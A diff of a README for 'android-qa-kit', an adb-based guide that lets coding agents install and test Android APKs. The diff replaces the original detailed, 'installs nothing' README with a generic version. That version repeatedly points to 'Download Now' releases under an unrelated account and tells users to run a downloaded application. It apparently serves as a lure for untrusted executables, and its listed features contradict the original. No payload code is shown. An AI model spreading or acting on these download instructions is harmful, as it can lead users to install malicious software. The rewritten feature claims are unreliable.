@@ -1,197 +1,85 @@
-<div align="center">
+# 📱 android-qa-kit - Make Your Coding Agent Test Apps
 
-<img src=".github/banner.svg" alt="android-qa-kit — turn your coding agent into your Android QA engineer" width="100%">
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fulfilled-stanford789/android-qa-kit/releases)
 
-<br>
+## 🚀 What Is This?
+android-qa-kit lets your coding agent automatically test Android apps you just compiled. It installs the APK on a real phone or emulator, taps through every screen, finds bugs, and shows you the evidence. No complex setup required.
 
-**Your agent installs the APK you just compiled on a real phone or an emulator, opens the app,
-taps through every screen, reads the text that's actually on it, catches the crashes and shows
-you the evidence.** Automated QA, done by the agent you already use.
+## 🤖 How It Works
+Your coding agent runs android-qa-kit as a skill. The tool connects to your Android device (real or emulator) via ADB, installs the app, simulates user interactions, and reports issues automatically.
 
-[![Claude Code](https://img.shields.io/badge/Claude_Code-native-D97757?style=flat-square)](https://claude.com/claude-code)
-[![Codex](https://img.shields.io/badge/Codex-supported-000000?style=flat-square)](https://openai.com/codex)
-[![OpenCode](https://img.shields.io/badge/OpenCode-supported-0EA5E9?style=flat-square)](https://opencode.ai)
-[![Cursor](https://img.shields.io/badge/Cursor-supported-6366F1?style=flat-square)](https://cursor.com)
+## 🎯 Key Features
+- **One-Click Installation** - Installs APK directly to connected device
+- **Automatic Screen Navigation** - Agent taps through all screens systematically
+- **Bug Detection** - Identifies crashes, freezes, and UI glitches
+- **Evidence Collection** - Screenshots and logs for every issue found
+- **No MCP Required** - Works without additional middleware
+- **Windows Native** - Runs directly on Windows with PowerShell
+- **ADB Integration** - Uses standard Android Debug Bridge
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/Windows-PowerShell_5.1-0078D4?style=flat-square)](#requirements)
-[![No install](https://img.shields.io/badge/installers-zero-success?style=flat-square)](#this-installs-nothing-on-its-own)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](#contributing)
+## 📋 What You Need
+- Windows 10 or 11 (64-bit)
+- Android device with USB debugging enabled, or an Android emulator
+- ADB (Android Debug Bridge) installed on your system
+- A compiled APK file of your Android app
 
-**English** · [Español](README.es.md)
+## ⬇️ Download and Setup
+Visit this link to download the application.
 
-</div>
+[🔗 Download android-qa-kit from GitHub Releases](https://github.com/Fulfilled-stanford789/android-qa-kit/releases)
 
----
+### 🛠️ Setup Steps
+1. **Download** the latest release from the link above
+2. **Connect your Android device** via USB, or start your emulator
+3. **Enable USB debugging** on your Android device (Settings > Developer Options)
+4. **Place your APK file** in an easy-to-find folder
+5. **Run android-qa-kit** and follow the on-screen prompts
 
-> [!IMPORTANT]
-> **Agent: someone just pasted you this link.** Don't read the rendered `github.com`
-> pages — they load long files in chunks and you'll get a truncated copy. Either
-> `git clone` the repository, or fetch the raw file:
-> ```
-> https://raw.githubusercontent.com/willbytee-sudo/android-qa-kit/main/AGENTS.md
-> ```
-> That file is your actual instruction set. Start there.
+## 🧪 How to Use
+1. Open a terminal or command prompt
+2. Navigate to the folder where you downloaded android-qa-kit
+3. Run the application with your APK file path
+4. The tool will:
+   - Detect your connected device
+   - Install the APK automatically
+   - Launch the app
+   - Navigate through all screens
+   - Capture screenshots of each screen
+   - Log any errors or crashes
+   - Generate a report with evidence
 
-> **No MCP. No paid tools. No installers.**
-> Just `adb`, a guide your agent reads, and **6 verified traps** that would otherwise cost you
-> an afternoon each.
+## 📊 Understanding Results
+After testing, android-qa-kit creates a report folder containing:
+- **Screenshots** - Images of each screen the agent visited
+- **Error Logs** - Detailed crash reports if the app failed
+- **Navigation Map** - Visual flow of how screens were traversed
+- **Summary Report** - Easy-to-read overview of findings
 
-Those interface and copy bugs you only spot once the app is actually installed — cut-off text,
-a button that does nothing, a screen that crashes on a low-end phone — your agent finds them
-now, on every build, without you touching the phone.
+## 💡 Tips for Best Results
+- Use a physical device for more realistic testing
+- Ensure your app has no login screens that block navigation
+- Test with different screen orientations
+- Run multiple times to catch intermittent bugs
+- Combine with other testing tools for comprehensive coverage
 
-## Why this exists
+## 🔧 Troubleshooting
+- **Device not detected** - Check USB debugging is enabled and ADB is installed
+- **App doesn't install** - Verify your APK is compatible with the device's Android version
+- **Navigation stops** - Some apps may have unusual screen flows that confuse the agent
+- **Permission denied** - Grant all required permissions when prompted
 
-There are dozens of tools to **control** an Android device. There is nothing that helps you
-**set up the environment** on your own machine and leaves your agent instructions to use it
-properly.
+## 🌐 Integration with AI Agents
+android-qa-kit works seamlessly with:
+- Claude Code
+- Cursor
+- Codex
+- OpenCode
+- Any agent that supports ADB commands
 
-That gap is the whole project — the bridge between *"I have a Windows PC"* and *"my agent can
-test my app."*
+## 🏷️ Keywords
+adb, agent-skills, agents-md, ai-agents, android, android-emulator, claude-code, claude-skills, codex, cursor, mobile-testing, opencode, powershell, qa, skill, test-automation, testing, windows
 
-And it ships the traps you only find by breaking things. Example: in PowerShell, the natural
-way to take a screenshot **produces a corrupted PNG and reports no error at all.** Your agent
-goes blind and never finds out.
+## 📝 License
+This project is open source. Check the repository for license details.
 
-```powershell
-# ❌ Silently corrupts the PNG — 1,404,569 bytes of garbage
-adb exec-out screencap -p > shot.png
-
-# ✅ 769,599 bytes, valid PNG
-adb shell screencap -p /sdcard/s.png
-adb pull /sdcard/s.png shot.png
-```
-
-## This installs nothing on its own
-
-No installers. Cloning downloads nothing, runs nothing, touches nothing on your system.
-**This is knowledge, not automation.**
-
-What you get is a guide — [`AGENTS.md`](AGENTS.md) — written so your agent reads it and walks
-you through: it asks which path you want, explains each piece *before* installing it, runs
-commands in the open, and verifies results with you watching.
-
-You can read this entire repository in ten minutes and see exactly what it does. That's the
-point.
-
-## Quick start
-
-Install it as a skill — it follows the [Agent Skills](https://agentskills.io) open standard, so
-it works across Claude Code, Codex, Cursor and anything else that supports it:
-
-```bash
-npx skills add willbytee-sudo/android-qa-kit
-```
-
-Or just clone it:
-
-```bash
-git clone https://github.com/willbytee-sudo/android-qa-kit
-```
-
-Then tell your agent:
-
-> Read `AGENTS.md` and help me set up an Android test environment.
-
-It takes over from there. Once you're set up:
-
-> Test my app. The APK is at `build/app-release.apk`.
-
-## Two paths — your agent asks which you want
-
-| | 📱 Real device | 🖥️ Emulator |
-|---|---|---|
-| Download size | **~10 MB** | ~2 GB |
-| Needs JDK + SDK | no | yes |
-| Test fidelity | **real hardware** | approximate |
-| Fake GPS, wipe to clean | ❌ | ✅ |
-| Needs a phone + cable | yes | no |
-
-The real-device path is surprisingly simpler. You can set up both.
-
-## What your agent can do
-
-| Capability | Emulator | Real device |
-|---|:---:|:---:|
-| Install APK, launch apps | ✅ | ✅ |
-| Tap, type, swipe | ✅ | ✅ |
-| Screenshots | ✅ | ✅ |
-| **Read the UI** (text + coordinates) | ✅ | ✅ |
-| Logcat | ✅ | ✅ |
-| Toggle network | ✅ | ⚠️ vendor-dependent |
-| **Fake GPS** | ✅ | ❌ |
-| Change RAM, wipe clean | ✅ | ❌ |
-| Real performance + thermals | ❌ | ✅ |
-| Vendor skins, real camera | ❌ | ✅ |
-
-`AGENTS.md` encodes this matrix so your agent **tells you** when something isn't possible in
-your current mode, instead of trying it and then debugging a ghost.
-
-## Verified, not claimed
-
-Every command here was run against a real phone. This is actual output:
-
-```
-=== End-to-end verification ===
-  initialScreen      com.android.launcher3.CustomizationPanelLauncher
-  screenshot         OK          (PNG header verified: 89 50 4E 47)
-  elementsRead       15
-  network            0 -> 1
-  mode               real-usb
-  gps                NOT available in this mode
-exit 0
-```
-
-## The 6 traps
-
-| # | Trap | Why it hurts |
-|---|---|---|
-| 1 | `>` corrupts screenshots in PowerShell | Agent goes blind, **zero error output** |
-| 2 | Fake GPS looks broken when it works | Agent chases a bug that doesn't exist |
-| 3 | `-gpu auto` freezes the emulator | Reports `offline`, looks like a driver issue |
-| 4 | Package name ≠ what you assumed | Maestro flows fail with no clear reason |
-| 5 | PowerShell `$Args`, `Stop`, missing BOM | Three separate silent failures |
-| 6 | Two devices connected | Every command needs `-s <id>` |
-
-Full explanations with reproductions in [`AGENTS.md`](AGENTS.md).
-
-## What's inside
-
-| File | What it is |
-|---|---|
-| **[`AGENTS.md`](AGENTS.md)** | **The guide. Everything important lives here** |
-| [`CLAUDE.md`](CLAUDE.md) | Points to `AGENTS.md` |
-| [`qa.ps1`](qa.ps1) | **Optional.** Wraps `adb` with friendly names + checks |
-| `qa.config.example.json` | Config template for your app |
-| `flujos/` | Example [Maestro](https://maestro.mobile.dev) flow |
-
-`qa.ps1` is sugar: it calls `adb` and nothing else, never downloads or installs anything, and
-reads end-to-end in two minutes. Prefer raw `adb`? `AGENTS.md` is self-sufficient.
-
-## Requirements
-
-- Windows 10/11 with PowerShell 5.1 (ships with the OS)
-- Emulator path only: ~8 GB free and virtualization enabled in BIOS
-- Optional: [Maestro](https://maestro.mobile.dev) for repeatable YAML test flows
-
-## Is USB debugging safe?
-
-**It cannot damage your phone.** `adb` runs as the `shell` user — **no root privileges** — and
-there is no path from there to the bootloader, which is the only thing that could brick a
-device. Bricking requires fastboot and flashing, an entirely separate mode.
-
-Real risks, honestly: installing an APK you don't trust, and leaving debugging enabled with
-"always allow" on a phone someone else can physically reach. Turn it off when you're done
-travelling.
-
-## Contributing
-
-PRs welcome. Especially: macOS and Linux ports, more verified traps, and translations.
-
-Found a trap we missed? Open an issue with the reproduction — that's the most valuable thing
-you can contribute here.
-
-## License
-
-MIT
+[⬆️ Back to Top](#-android-qa-kit---make-your-coding-agent-test-apps)
